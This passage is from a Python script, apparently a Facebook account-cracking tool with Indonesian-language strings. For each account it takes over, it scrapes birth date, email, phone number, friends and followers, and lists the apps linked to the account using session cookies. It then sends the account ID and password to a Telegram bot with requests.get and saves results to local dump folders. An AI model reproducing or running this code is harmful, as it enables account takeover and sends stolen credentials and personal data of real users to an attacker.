                        ttl = re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
                    except:ttl = ''
                    
                    try:
                        teman = re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
                    except:teman = ''
                    
                    try:
                        pengikut = re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
                    except:pengikut = ''
                    
                    try:
                        tahun = ''
                        cek_thn = re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                        for nenen in cek_thn:
                            tahun += nenen + ', '
                    except:pass
                    infoakun += f'''• ( 𝙾𝙺 )\n⥁_______________________⥀\n🌸 • 𝙸𝙳 : {idf}\n🌸 • 𝙿𝙰𝚂𝚂 : {pw}\n⥁_______________________⥀\n🌸 • 𝚃𝙷𝙴 𝙴𝙼𝙰𝙸𝙻 : {email}\n🌸 • 𝙳𝙰𝚃𝙴 : {tahun}\n🌸 • 𝚃𝙷𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 : {nomer}\n⥁_______________________⥀\n\n◆ ➛ @𝚉𝙾𝚁𝙾𝚡 '''
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(infoakun))
                    (hit1, hit2) = (0, 0)
                    cek = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=headapp).text
                    cek2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=coki, headers=headapp).text
                    if 'Diakses menggunakan Facebook' in re.findall('\\<title\\>(.*?)<\\/title\\>', str(cek)):
                        infoakun += 'Aplikasi Yang Terkait*\n'
                        if 'Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.' in cek:
                            infoakun += 'Tidak Ada Aplikasi Aktif Yang Terkait *\n'
                        else:
                            infoakun += '\tAplikasi Aktif : \n'
                            apkAktif = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek))
                            ditambahkan = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek))
                            for muncul in apkAktif:
                                hit1 += 1
                                infoakun += f'''\t\t[{hit1}] {muncul} {ditambahkan[hit2]}\n'''
                                hit2 += 1
                        if 'Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau' in cek2:
                            infoakun += '\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n'
                        else:
                            (hit1, hit2) = (0, 0)
                            infoakun += '\tAplikasi Kedaluwarsa :\n'
                            apkKadaluarsa = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek2))
                            kadaluarsa = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek2))
                            for muncul in apkKadaluarsa:
                                hit1 += 1
                                infoakun += f'''\t\t[{hit1}] {muncul} {kadaluarsa[hit2]}\n'''
                                hit2 += 1
                    print('\n')
                    statusok = f'''• ( 𝙾𝙺 )\n_______________________\n\n  ✨ • 𝙸𝙳 ➛ {idf}\n\n\n  ✨ • 𝙿𝙰𝚂𝚂 ➛ {pw}\n\n_______________________\n  ✨ • 𝚄𝚁𝙻 ➛ 𝚑𝚝𝚝𝚙𝚜://𝚠𝚠𝚠.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔.𝚌𝚘𝚖/𝚙𝚛𝚘𝚏𝚒𝚕𝚎.𝚙𝚑𝚙?𝚒𝚍={𝚒𝚍𝚏}&𝚖𝚒𝚋𝚎𝚡𝚝𝚒𝚍=𝚉𝚋𝚆𝙺𝚠𝙻
\n\n_______________________\n• 𝙱𝚈 ➛ @𝚉𝙾𝚁𝙾𝚡\n'''
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
                    cek_RAVEN(kuki)
    
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1

def cek_RAVEN(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              🌱 %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              🌱 %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

if __name__ == '__main__':
    
    try:os.system('git pull')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('/sdcard/ALVINO-DUMP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
    try:os.system('pkg install play-audio')
    except:pass
    try:os.system('clear')
    except:pass
    login()